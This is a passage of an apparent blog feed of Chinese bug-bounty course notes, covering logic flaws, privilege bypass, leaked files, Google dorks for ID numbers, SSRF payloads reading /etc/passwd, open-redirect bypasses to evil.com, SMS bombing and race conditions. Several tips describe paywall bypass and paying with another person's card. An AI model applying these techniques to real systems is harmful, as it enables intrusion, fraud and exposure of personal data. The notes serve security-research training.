title="付费简历模板"></a>付费简历模板</h1><p>页面存在付费模板和免费模板。<br>免费模板可预览，可编辑，导出到本地。付费模板只能先选择购买，无法点击预览。</p><p>操作方式（前端越权）：<br>F12，将免费模板可预览的代码复制。然后将代码粘贴到付费模板。<br>此时付费模板即可预览。</p><h1 id="spring技巧-1"><a href="#spring技巧-1" class="headerlink" title="spring技巧-1"></a>spring技巧-1</h1><p><code>https://xxx.com/swagger-resources</code><br>用默认字典去扫，可以看到显示为：<br><code>[&#123;&quot;name&quot;:&quot;default&quot;,&quot;location&quot;:&quot;/--internal--/swgr&quot;,&quot;swaggerVersion&quot;:&quot;2.0&quot;&#125;]</code></p><p>此时选择做一个拼接：<br>拼接路径(价值10元): <code>https://xxx.com/--internal--/swgr</code><br>重点关注paths路径，看一下请求方法，是get还是post，直接去跑目录<br>例如： <code>/--internal--/mgmt/env/</code> 如果返回401，则说明有鉴权，放弃<br><code>/user/messages/&#123;userMsgld&#125;</code>  显示unauthorized，则说明有鉴权，放弃</p><h1 id="spring技巧-2"><a href="#spring技巧-2" class="headerlink" title="spring技巧-2"></a>spring技巧-2</h1><p>swagger界面：监控平台控制台API文档</p><p>操作方式： 首先点右上角Try it out，然后点id*required，加上相应的值，最后点Execute。<br>抓包查看是否成功。<br>成功则说明可以造成越权操作。<br>不仅可以挖越权，还有注入，XSS，上传等等。</p><h1 id="host碰撞漏洞"><a href="#host碰撞漏洞" class="headerlink" title="host碰撞漏洞"></a>host碰撞漏洞</h1><p>host碰撞不是漏洞，只是找到一个资产（不可提交）</p><p>操作方式：打开某个内网，一般无法访问。本地配置host文件，再访问即可。<br>host碰撞工具: <code>https://github.com/fofapro/Hosts_scan</code></p><h1 id="空白页对抗"><a href="#空白页对抗" class="headerlink" title="空白页对抗"></a>空白页对抗</h1><p>通过findsomething，查找接口。找到隐藏信息。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本课内容主要是补充之前没讲到的。逻辑漏洞新课程第1节。&lt;/p&gt;</summary>
    
    
    
    <category term="SRC" scheme="http://example.com/categories/SRC/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>SRC_course_10</title>
    <link href="http://example.com/2023/12/17/SRC_course_10/"/>
    <id>http://example.com/2023/12/17/SRC_course_10/</id>
    <published>2023-12-16T16:00:00.000Z</published>
    <updated>2023-12-17T13:13:53.522Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>捡漏洞。漏洞课程第5节。</p><span id="more"></span><h1 id="信息泄露漏洞"><a href="#信息泄露漏洞" class="headerlink" title="信息泄露漏洞"></a>信息泄露漏洞</h1><h2 id="案例1–目录文件泄露"><a href="#案例1–目录文件泄露" class="headerlink" title="案例1–目录文件泄露"></a>案例1–目录文件泄露</h2><p>直接访问web应用存在的一些目录，如果返回文件列表信息，证明存在此漏洞。（一般需要有敏感文件）</p><p>挖掘方法：Google Hacking 语法: intext:Index of &#x2F;</p><h2 id="案例2–git源码泄露"><a href="#案例2–git源码泄露" class="headerlink" title="案例2–git源码泄露"></a>案例2–git源码泄露</h2><p>利用工具GitHack.py( <code>https://github.com/lijiejie/GitHack</code> )<br><code>python GitHack.py https://ip/.git/</code> 即可将源码下载</p><h2 id="案例3–svn信息泄露"><a href="#案例3–svn信息泄露" class="headerlink" title="案例3–svn信息泄露"></a>案例3–svn信息泄露</h2><p>利用工具: <code>https://github.com/admintony/svnExploit</code><br>示例: <code>xx.com/lab2/.svn/entries</code></p><h2 id="案例4–DS-Store文件泄露-htacess泄露"><a href="#案例4–DS-Store文件泄露-htacess泄露" class="headerlink" title="案例4–DS_Store文件泄露, htacess泄露"></a>案例4–DS_Store文件泄露, htacess泄露</h2><p>利用脚本: <code>https://github.com/lijiejie/ds_store_exp</code></p><p>漏洞示例: <code>https://www.example.com/.DS_Store</code><br><code>https://www.example.com/.htacess</code></p><h2 id="案例5–泄露合集"><a href="#案例5–泄露合集" class="headerlink" title="案例5–泄露合集"></a>案例5–泄露合集</h2><p>druid未授权访问漏洞<br><code>ip/druid/index.html  ## Druid Index</code><br><code>ip/druid/sql.html  ## Druid sql监控页面</code><br><code>ip/druid/weburi.html  ## Druid Web URI监控页面</code><br><code>ip/druid/websession.html  ## Druid Web Session监控页面</code><br><code>json:ip/druid/webrui.json  ## Druid Web URI json</code><br><code>ip/druid/websession.json  ## Druid Web Session json</code><br>Druid 登录接口: <code>ip/druid/login.html  ## Druid登录认证页面Druid未授权访问路径</code></p><p><strong>其它泄露</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/debug/pprof/cmdline</span><br><span class="line">/.DS_Store</span><br><span class="line">/.git/index/</span><br><span class="line">/.svn/entries</span><br><span class="line">/graphql</span><br><span class="line">/tenant</span><br><span class="line">/sources</span><br><span class="line">/actuators/env/</span><br><span class="line">/swagger-ui.html</span><br></pre></td></tr></table></figure><p>Spring的env泄露<br><code>/actuator/env</code></p><p>Spring泄露（可测接口）<br><code>/swagger-ui.html</code></p><p><code>/.bashrc</code> 个人配置记录<br><code>/.ssh/authorized_keys</code> 公钥<br><code>/.bash_history 泄露了站点服务器所有的操作记录</code></p><p>sql查询语句泄露（报错即可）</p><h2 id="补充案例1–测试环境"><a href="#补充案例1–测试环境" class="headerlink" title="补充案例1–测试环境"></a>补充案例1–测试环境</h2><p>测试环境漏洞环境<br>资产脆弱点一般在测试环境</p><ol><li>一般的测试开发环境，域名中总会带有一些特别的标记来识别，如常见的一些 <code>dev.xxx.com stc.xxx.com stm.xxx.com cmm..xxx.com test.xxx.com</code> 等等</li><li>某些SRC平台在他们的评分标准中已经整理出一些测试域名，如oppsrc: OSRC OPPO自有业务的测试环境，包括且不限于域名中含有dev、test，或业务为开发测试之用，或域名属于: <code>*.wanyol.com  *.myoas.net</code></li></ol><h2 id="补充案例2–网盘"><a href="#补充案例2–网盘" class="headerlink" title="补充案例2–网盘"></a>补充案例2–网盘</h2><p>威胁情报获取（网盘）<br>通过企业名+关键词的方法进行排查，常见关键词有：<br>合同，设计图纸，身份证，通讯录，花名册，报表，投标文件，入职等。<br>情报提交时说明网盘链接h和截图，方便厂商排查即可。<br>推荐网盘搜索引擎：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://www.lingfengyun.com/</span><br><span class="line">https://www.quzhuanpan.com/</span><br><span class="line">https://www.pansoso.com/</span><br><span class="line">https://wp.soshoulu.com/</span><br></pre></td></tr></table></figure><h2 id="补充案例3–浏览器"><a href="#补充案例3–浏览器" class="headerlink" title="补充案例3–浏览器"></a>补充案例3–浏览器</h2><p>威胁情报获取（浏览器）<br>Google搜索payload(文件类型+根域+关键词)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">filetype:xls site:xxx.example.com sfzh</span><br><span class="line">filetype:xls site:xxx.example.com 身份证号</span><br><span class="line">filetype:pdf site:xxx.example.com sfzh</span><br><span class="line">filetype:pdf site:xxx.example.com 身份证号</span><br></pre></td></tr></table></figure><p>bing搜payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inurl:example inurl:PDF 机密等级 ABC</span><br><span class="line">inurl:/backup intitle:index of backup intext:*sql site:xxx.example.com</span><br></pre></td></tr></table></figure><h2 id="补充案例4–可能错过的漏洞"><a href="#补充案例4–可能错过的漏洞" class="headerlink" title="补充案例4–可能错过的漏洞"></a>补充案例4–可能错过的漏洞</h2><p>需要二次认证的账号（拿到账号密码，虽然进不去，可以直接提交）</p><h2 id="补充案例5–网站被黑信息"><a href="#补充案例5–网站被黑信息" class="headerlink" title="补充案例5–网站被黑信息"></a>补充案例5–网站被黑信息</h2><p>在该URL处：<code>http://xx.com/js/dywe.js</code> ,访问js，在sidmap参数处可以看到很多url，访问发现为与xxx无关的恶意请求</p><h1 id="具体案例"><a href="#具体案例" class="headerlink" title="具体案例"></a>具体案例</h1><h2 id="刷赞"><a href="#刷赞" class="headerlink" title="刷赞"></a>刷赞</h2><p>返回包中出现存在点赞数量，修改数量即可。</p><h2 id="日志泄露"><a href="#日志泄露" class="headerlink" title="日志泄露"></a>日志泄露</h2><p>发现日志记录直接提交</p><h2 id="上传XSS"><a href="#上传XSS" class="headerlink" title="上传XSS"></a>上传XSS</h2><p>除了普通的上传xss文件，还可以上传svg格式的xss</p><h2 id="XXL-JOB-任务调度中心-反弹getshell"><a href="#XXL-JOB-任务调度中心-反弹getshell" class="headerlink" title="XXL-JOB(任务调度中心)-反弹getshell"></a>XXL-JOB(任务调度中心)-反弹getshell</h2><p>xxl-job命令执行<br><code>https://xxx.com/toLogin</code><br>存在弱口令<br>可利用任务调度执行反弹shell</p><h2 id="shiro反序列化漏洞"><a href="#shiro反序列化漏洞" class="headerlink" title="shiro反序列化漏洞"></a>shiro反序列化漏洞</h2><p>利用工具</p><h2 id="app-XSS"><a href="#app-XSS" class="headerlink" title="app XSS"></a>app XSS</h2><p>app的XSS比较多</p><h1 id="场景案例"><a href="#场景案例" class="headerlink" title="场景案例"></a>场景案例</h1><h2 id="抽奖场景"><a href="#抽奖场景" class="headerlink" title="抽奖场景"></a>抽奖场景</h2><p>从“中奖用户”这个点：尝试查看用户敏感信息，如手机号<br>从“抽奖”这个点：尝试并发，重放。还有修改抽奖积分为负值。<br>从“抽奖记录”这个点：尝试越权查看其它用户信息。<br>从“赚积分”这个点：尝试大量赚取积分。</p><p>注意隐藏参数</p><p>在线客服：尝试XSS</p><p>抓包的userId，找到没被加密的id。</p><h2 id="论坛场景"><a href="#论坛场景" class="headerlink" title="论坛场景"></a>论坛场景</h2><p>发布问题添加payload</p><ol><li>利用位置绕过</li><li>app，小程序绕过</li><li>fuzz</li></ol><p>获取匿名用户的真实用户信息</p><h2 id="付费课程场景"><a href="#付费课程场景" class="headerlink" title="付费课程场景"></a>付费课程场景</h2><p>在观看试听课程点“章节”，抓包<br>查找m3u8文件链接。（m3u8是视频流文件）<br>可以直接在m3u8在线网站播放。</p><h2 id="通用思路"><a href="#通用思路" class="headerlink" title="通用思路"></a>通用思路</h2><p>场景：企业邮箱注册。<br>常规注册：利用本公司的公司邮箱注册<br>绕过：抓包，修改邮箱。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;捡漏洞。漏洞课程第5节。&lt;/p&gt;</summary>
    
    
    
    <category term="SRC" scheme="http://example.com/categories/SRC/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>SRC_course_11</title>
    <link href="http://example.com/2023/12/17/SRC_course_11/"/>
    <id>http://example.com/2023/12/17/SRC_course_11/</id>
    <published>2023-12-16T16:00:00.000Z</published>
    <updated>2023-12-17T14:57:59.638Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SSRF，CSRF，任意文件读取&#x2F;下载，URL跳转的区别。漏洞课程第6节。</p><span id="more"></span><h1 id="区分"><a href="#区分" class="headerlink" title="区分"></a>区分</h1><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>服务端请求伪造。</p><p>场景：<br>无法打开(内网): <code>oa.a.com</code><br>能够打开(外网): <code>www.a.com</code><br>假设存在ssrf漏洞: <code>www.a.com?url=oa.a.com</code> ，可回显oa页面。页面地址栏链接: <code>www.a.com?url=oa.a.com</code><br>构造链接: <code>http://www.example.com?url=http://22ss.dnslog.cn</code> ，如果显示ip是该网站ip，则可进行下一步利用。（自行查找进入内网地址）<br>利用方式: <code>http://www.a.com?url=http://192.168.1.1</code>  或  <code>http://www.a.com?url=file:///etc/passwd</code></p><h2 id="CSRF-修改密码-中危，二次利用的退出登录-低危100元，删除订阅-低危80元"><a href="#CSRF-修改密码-中危，二次利用的退出登录-低危100元，删除订阅-低危80元" class="headerlink" title="CSRF(修改密码:中危，二次利用的退出登录:低危100元，删除订阅:低危80元)"></a>CSRF(修改密码:中危，二次利用的退出登录:低危100元，删除订阅:低危80元)</h2><p>场景示例（适用于GET存在CSRF）：<br>社区的一个功能站，发帖子，个人中心可以上传头像，评论。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST: /pro/1 1.1</span><br><span class="line">Host: xxxx</span><br><span class="line"></span><br><span class="line">Username=abc&amp;images=http://www.xxx.com/logout&amp;type=2</span><br></pre></td></tr></table></figure><p>当其他人访问个人主页的时候，头像一般来说都是自动加载的，那么如果这块这个 <code>http://www.xxx.com/logout</code> 存在csrf漏洞，就可以立马让访问者退出登录。</p><p><strong>利用插件</strong></p><h2 id="任意文件读取-x2F-瞎子啊"><a href="#任意文件读取-x2F-瞎子啊" class="headerlink" title="任意文件读取&#x2F;瞎子啊"></a>任意文件读取&#x2F;瞎子啊</h2><p>链接构造示例: <code>http://www.example.com?url=../../etc/passwd</code></p><h2 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a>URL跳转</h2><p>链接构造示例: <code>http://www.example.com?url=http://www.evil.com</code><br>页面回显链接: <code>http://www.evil.com</code></p><h1 id="SSRF案例"><a href="#SSRF案例" class="headerlink" title="SSRF案例"></a>SSRF案例</h1><h2 id="案例1–参数"><a href="#案例1–参数" class="headerlink" title="案例1–参数"></a>案例1–参数</h2><p>根据参数寻找<br>如果不知道哪个参数，逐个尝试。<br>GET示例: <code>http://xx.com/prxoy.php?name=1&amp;pwd=11&amp;src_url=file:///etc/passwd</code><br>POST示例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url: http://xx.com/url/scrapy</span><br><span class="line"></span><br><span class="line">POST Data: url=http://www.baidu.com</span><br></pre></td></tr></table></figure><p>多数情况下不支持其它协议，只能使用http协议</p><h2 id="案例2–地址"><a href="#案例2–地址" class="headerlink" title="案例2–地址"></a>案例2–地址</h2><p>根据功能点–图片地址、链接地址<br>输入地址检测SSRF的存在</p><h2 id="案例3–输入框"><a href="#案例3–输入框" class="headerlink" title="案例3–输入框"></a>案例3–输入框</h2><p>根据功能点–输入框<br>点击“一键检测”，就会在它们的移动终端浏览器访问且截图返回</p><p>在自己网站放一个文件，嵌入百度的内网地址，然后再检测网站里的文件。</p><h2 id="案例4–nday"><a href="#案例4–nday" class="headerlink" title="案例4–nday"></a>案例4–nday</h2><p>查找各个OA存在的nday。</p><h2 id="案例5和6–全过程利用"><a href="#案例5和6–全过程利用" class="headerlink" title="案例5和6–全过程利用"></a>案例5和6–全过程利用</h2><p>场景：原功能是生成一个课表长图。<br>通过一个请求包中最后的链接，返回包会生成一个图片，返回图片链接。</p><p>利用方式：将请求包中的url替换成DNSlog协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Accept-Encoding:gzip,deflate</span><br><span class="line">content-type:application/json</span><br><span class="line">Referer:</span><br><span class="line"></span><br><span class="line">&#123;&quot;url&quot;:&quot;file:///etc/network%00&quot;&#125;</span><br></pre></td></tr></table></figure><p>同样的原理：<br>编辑器，上传图片，正常情况: <code>![图片](链接)</code><br>利用方式: <code>![图片](file:///etc/passwd)</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;SSRF，CSRF，任意文件读取&amp;#x2F;下载，URL跳转的区别。漏洞课程第6节。&lt;/p&gt;</summary>
    
    
    
    <category term="SRC" scheme="http://example.com/categories/SRC/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>SRC_course_9</title>
    <link href="http://example.com/2023/12/17/SRC_course_9/"/>
    <id>http://example.com/2023/12/17/SRC_course_9/</id>
    <published>2023-12-16T16:00:00.000Z</published>
    <updated>2023-12-17T13:13:43.061Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>常见高危漏洞类型。漏洞课程第4节。</p><span id="more"></span><h1 id="高危漏洞"><a href="#高危漏洞" class="headerlink" title="高危漏洞"></a>高危漏洞</h1><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><ol><li>仔细钻研挖掘的SRC评分标准</li><li>常规高危严重漏洞类型要知道</li><li>要知道官方想要什么漏洞</li></ol><h2 id="高危漏洞总结"><a href="#高危漏洞总结" class="headerlink" title="高危漏洞总结"></a>高危漏洞总结</h2><ol><li>webshell</li><li>严重的逻辑设计缺陷</li><li>严重的敏感信息泄露</li><li>拒绝服务漏洞（不建议挖掘，易违法。除非打自己客户端）</li><li>存储XSS（近2年不值钱了）</li><li>RCE（还行）</li><li>SSRF</li><li>SQL注入（不一定高危，可能会被审核坑）</li><li>支付漏洞</li></ol><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="案例1–webshell"><a href="#案例1–webshell" class="headerlink" title="案例1–webshell"></a>案例1–webshell</h3><p>现在这个时代能够getshell的类型大致两种：1、自己写的站。2、使用了成型的框架，框架存在漏洞</p><h3 id="案例2–越权"><a href="#案例2–越权" class="headerlink" title="案例2–越权"></a>案例2–越权</h3><p>越权修改，删除等。</p><h3 id="案例3–升级，严重的逻辑漏洞（只需要知道信用卡号即可消费）"><a href="#案例3–升级，严重的逻辑漏洞（只需要知道信用卡号即可消费）" class="headerlink" title="案例3–升级，严重的逻辑漏洞（只需要知道信用卡号即可消费）"></a>案例3–升级，严重的逻辑漏洞（只需要知道信用卡号即可消费）</h3><p>示例：</p><p>首先，随便下一个订单，到支付页面，选择信用卡支付。<br>输入正确的卡号，有效期。<br>姓名，身份证等相关信息随便输。</p><p>银行卡号：别人的<br>手机号：自己的<br>验证码：自己手机号接收的</p><h3 id="案例4–信息泄露"><a href="#案例4–信息泄露" class="headerlink" title="案例4–信息泄露"></a>案例4–信息泄露</h3><p>扫目录发现AK(AccessKeyID)，AS(AccessKeySecret)，Token(TokenSecret)字段。可成功登录，即是漏洞。</p><h3 id="案例5–验证码大小可控导致拒绝服务（能证明即可，勿打崩服务器）"><a href="#案例5–验证码大小可控导致拒绝服务（能证明即可，勿打崩服务器）" class="headerlink" title="案例5–验证码大小可控导致拒绝服务（能证明即可，勿打崩服务器）"></a>案例5–验证码大小可控导致拒绝服务（能证明即可，勿打崩服务器）</h3><p>得到URL后，抓包，进行如下修改：<br>将原本的H&#x3D;1000, W&#x3D;1000分别设置为10000<br>看到服务器响应包字节数如果有增大很多，则证明存在漏洞<br>（一般来说测试结果20-50倍即可打崩）</p><h3 id="案例6–存储XSS漏洞"><a href="#案例6–存储XSS漏洞" class="headerlink" title="案例6–存储XSS漏洞"></a>案例6–存储XSS漏洞</h3><h3 id="案例7–RCE"><a href="#案例7–RCE" class="headerlink" title="案例7–RCE"></a>案例7–RCE</h3><p>查找网上存在已知漏洞的poc，不建议扫描</p><h3 id="案例8–SQL注入漏洞"><a href="#案例8–SQL注入漏洞" class="headerlink" title="案例8–SQL注入漏洞"></a>案例8–SQL注入漏洞</h3><h3 id="案例9–支付漏洞"><a href="#案例9–支付漏洞" class="headerlink" title="案例9–支付漏洞"></a>案例9–支付漏洞</h3><p>订单编号可遍历</p><h3 id="案例10–任意文件下载"><a href="#案例10–任意文件下载" class="headerlink" title="案例10–任意文件下载"></a>案例10–任意文件下载</h3><p>目录穿越</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;常见高危漏洞类型。漏洞课程第4节。&lt;/p&gt;</summary>
    
    
    
    <category term="SRC" scheme="http://example.com/categories/SRC/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>SRC_course_8</title>
    <link href="http://example.com/2023/12/15/SRC_course_8/"/>
    <id>http://example.com/2023/12/15/SRC_course_8/</id>
    <published>2023-12-14T16:00:00.000Z</published>
    <updated>2023-12-17T13:13:38.035Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本课讲述了逻辑漏洞的种类及应用。逻辑漏洞课程第2,3课内容。</p><span id="more"></span><h1 id="漏洞类型概览"><a href="#漏洞类型概览" class="headerlink" title="漏洞类型概览"></a>漏洞类型概览</h1><h2 id="任意用户漏洞"><a href="#任意用户漏洞" class="headerlink" title="任意用户漏洞"></a>任意用户漏洞</h2><h3 id="任意用户注册"><a href="#任意用户注册" class="headerlink" title="任意用户注册"></a>任意用户注册</h3><ol><li>可覆盖注册。将系统中存在的账号再次注册。多数情况下会接管，少数情况会变成新号。（高危）</li><li>不可覆盖注册。只能注册系统中不存在的账号。出现概率较高。（低危）</li></ol><h3 id="任意用户登录"><a href="#任意用户登录" class="headerlink" title="任意用户登录"></a>任意用户登录</h3><h3 id="任意用户密码重置"><a href="#任意用户密码重置" class="headerlink" title="任意用户密码重置"></a>任意用户密码重置</h3><h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>做了不属于自己权限的事。</p><ol><li>垂直越权</li><li>水平越权</li><li>不常见越权</li></ol><p>绕过方式1：删除字段（删除token或token以外的字段）<br>绕过方式2：cookie越权（修改可遍历的参数，可预知）<br>绕过方式3：绕过原始密码认证（低危或忽略）<br>绕过方式4：抓包控制信息泄露，避免跳转<br>绕过方式5：需要多个数据（若用户收货地址只有1个时不能删除）<br>绕过方式6：双因子绕过（需要修改uid和uuid，可遍历先尝试遍历，不可遍历尝试找泄露点）<br>绕过方式7：修改url路径参数值实现垂直越权（比如 <code>?app=user</code> 改为 <code>?app=admin</code> ）<br>绕过方式8：思路很重要（下订单时收货地址id可修改）<br>绕过方式9：思维（cookie中存在手机号，直接将手机号修改为任意11位数字）<br>绕过方式10：js（打开某地址，是一个登陆口，直接审计js，找到接口。）（插件findsthing）</p><h2 id="不同类型站点一览"><a href="#不同类型站点一览" class="headerlink" title="不同类型站点一览"></a>不同类型站点一览</h2><p>电商、论坛、直播、大学</p><h3 id="越权漏洞之构造参数（查找敏感信息，进行敏感操作）"><a href="#越权漏洞之构造参数（查找敏感信息，进行敏感操作）" class="headerlink" title="越权漏洞之构造参数（查找敏感信息，进行敏感操作）"></a>越权漏洞之构造参数（查找敏感信息，进行敏感操作）</h3><ol><li>先f12找到js里面的参数</li><li>只找到查找功能的menu列表的借口可以访问</li><li>根据经验，构造添加借口，<code>POST xxx.com/api/v1/menu</code><br>根据返回值构造数据包<br>数据<br><code>&#123;&quot;name&quot;:&quot;testest&quot;,&quot;type&quot;:&quot;1&quot;,&quot;parentId&quot;:&quot;-1&quot;,&quot;href&quot;:&quot;test1test&quot;&#125;,</code></li></ol><p>可以看到成功添加</p><p>经验总结:<br>后台模块的借口格式一般是</p><p>添加的接口一般是POST &#x2F;PUT &#x2F;api&#x2F;模块名，<br>POST &#x2F;api&#x2F;模块名&#x2F;add</p><p>删除的一般是 DELETE &#x2F;api&#x2F;模块名&#x2F;id<br>GET &#x2F;api&#x2F;模块名&#x2F;del?id&#x3D;<br>POST &#x2F;api&#x2F;模块名&#x2F;</p><p>修改一般是 POST &#x2F;api&#x2F;模块名&#x2F;modify<br>POST &#x2F;api&#x2F;模块名</p><p>查询一般是 GET &#x2F;api&#x2F;模块名&#x2F;list<br>&#x2F;api&#x2F;模块名&#x2F;all</p><p>如果js文件中只有查询的接口，那么可以自己尝试一下构造添加、修改和删除接口</p><p><strong>插件推荐</strong><br>js提取：JSFinder<br>工具地址: <code>https://github.com/Threezh1/JSFinder</code></p><p><strong>额外</strong></p><ol><li><p>巧用搜索引擎 Google hacker<br>示例:<br>保险业务 <code>保单 site:exc.com filetype:xls</code></p></li><li><p>组合拳：越权修改+xss<br>自己搭建盲打平台</p></li></ol><h2 id="其它逻辑漏洞"><a href="#其它逻辑漏洞" class="headerlink" title="其它逻辑漏洞"></a>其它逻辑漏洞</h2><p>以案例展示</p><h3 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a>短信轰炸</h3><p>判定标准：一分钟内收到30（50）+条的短信。<br>分类：</p><ol><li>横向轰炸。可以给多个手机号同时发短信，这类漏洞大部分忽略。</li><li>纵向轰炸。给同一个手机号同时发多条短信。</li></ol><p>如果发短信&#x2F;邮件被限制，可选择：</p><ol><li>垃圾字符(英文字母)</li><li>垃圾字符(+86)</li><li>垃圾字符(空格)</li><li>双写(mobile&#x3D;13333333333,1343333333或mobile&#x3D;13333333333&amp;mobile&#x3D;1343333333)</li><li>XFF进行IP伪造(X-Forwarded-For: 127.0.0.1)(放在倒数第二排)（可用插件伪造ip，如X-Forwarded-For Header，burpfakeip）</li><li>邮箱轰炸可改大小写绕过(如: <code>111@qq.CoM</code> )</li></ol><h3 id="URL跳转漏洞（不值钱）"><a href="#URL跳转漏洞（不值钱）" class="headerlink" title="URL跳转漏洞（不值钱）"></a>URL跳转漏洞（不值钱）</h3><p>URL没有任何限制，所以恶意用户可以提交 <code>http://www.aaa.com/1.php?url=http://www.bbb.com</code> (跳转到钓鱼网站)来生成自己的恶意链接，安全意识较低的用户可能会被欺骗。</p><p>挖掘方式（参数下手）：redirect, redirect_to, url等等（或者直接尝试所有参数）<br>绕过方式1：单斜线“&#x2F;”绕过<br>绕过方式2：缺少协议绕过（ <code>?url=//www.evil.com</code> ）<br>绕过方式3：多斜线“&#x2F;”绕过（ <code>?url=///www.evil.com</code> ）<br>绕过方式4：@符号绕过<br>绕过方式5：反斜线“\”绕过<br>绕过方式6：#符号绕过<br>绕过方式7：?符号绕过<br>绕过方式8：“\\”绕过<br>绕过方式9：“.”绕过（ <code>?url=.evil.com</code> ）<br>绕过方式10：重复特殊字符绕过（ <code>?url=///www.evil.com//</code> ）</p><h3 id="电商漏洞"><a href="#电商漏洞" class="headerlink" title="电商漏洞"></a>电商漏洞</h3><p>提前购买：先选择能买的，然后将id修改为不能买的，实现提前购买。</p><h3 id="匿名漏洞（高危）"><a href="#匿名漏洞（高危）" class="headerlink" title="匿名漏洞（高危）"></a>匿名漏洞（高危）</h3><p>查看源代码，抓包查看。</p><h3 id="fuzz漏洞"><a href="#fuzz漏洞" class="headerlink" title="fuzz漏洞"></a>fuzz漏洞</h3><p>在注册时，存在隐藏参数，如: usertype&#x3D;1, userlevel&#x3D;1, userrank&#x3D;1等等。</p><h2 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h2><p>支付漏洞大致类型：</p><ol><li>低价充值；越权花别人的钱</li><li>服务年限延长；更少的钱获得服务并生成多个优惠订单</li><li>交易密码绕过</li></ol><h3 id="签约漏洞-高危"><a href="#签约漏洞-高危" class="headerlink" title="签约漏洞(高危)"></a>签约漏洞(高危)</h3><p>场景：<br>新用户购买vip，首月优惠价格6元，第2个月再次购买或续费就恢复原价10元。<br>购买时，两种支付手段：微信，支付宝。<br>分别生成一个订单，同时支付。获得2个月会员，并且仅支付12元。（或重放数据包，Repeater同时支付。并发。）</p><h2 id="并发漏洞"><a href="#并发漏洞" class="headerlink" title="并发漏洞"></a>并发漏洞</h2><p>使用工具：burp 或 fd</p><p>burp插件：Turbo Intruder<br>安装好插件后使用方法: </p><ol><li>右键 <code>Send to Turbo Intruder</code></li><li>上半部分模块打上 <code>x-req:%s</code></li><li>中间改为 <code>examples/race.py</code></li><li>最后Attack</li></ol><h1 id="案例分享"><a href="#案例分享" class="headerlink" title="案例分享"></a>案例分享</h1><p>爆破需要挂代理IP池，否则ip会被封。</p><h2 id="任意用户漏洞-1"><a href="#任意用户漏洞-1" class="headerlink" title="任意用户漏洞"></a>任意用户漏洞</h2><h3 id="案例1–四位数验证码可爆破"><a href="#案例1–四位数验证码可爆破" class="headerlink" title="案例1–四位数验证码可爆破"></a>案例1–四位数验证码可爆破</h3><p>任何需要发验证码的地方都可能存在。<br>登录口存在该漏洞，是高危漏洞。<br>登录进入存在该漏洞，一般是中危或低危。（可自评高危）<br>六位数验证码可爆破漏洞，可收。（中危）</p><p>严重漏洞慎选。</p><h3 id="案例2–验证码回显"><a href="#案例2–验证码回显" class="headerlink" title="案例2–验证码回显"></a>案例2–验证码回显</h3><p>返回包中存在正确的验证码。</p><h3 id="案例3–只验证了验证码，未做绑定验证"><a href="#案例3–只验证了验证码，未做绑定验证" class="headerlink" 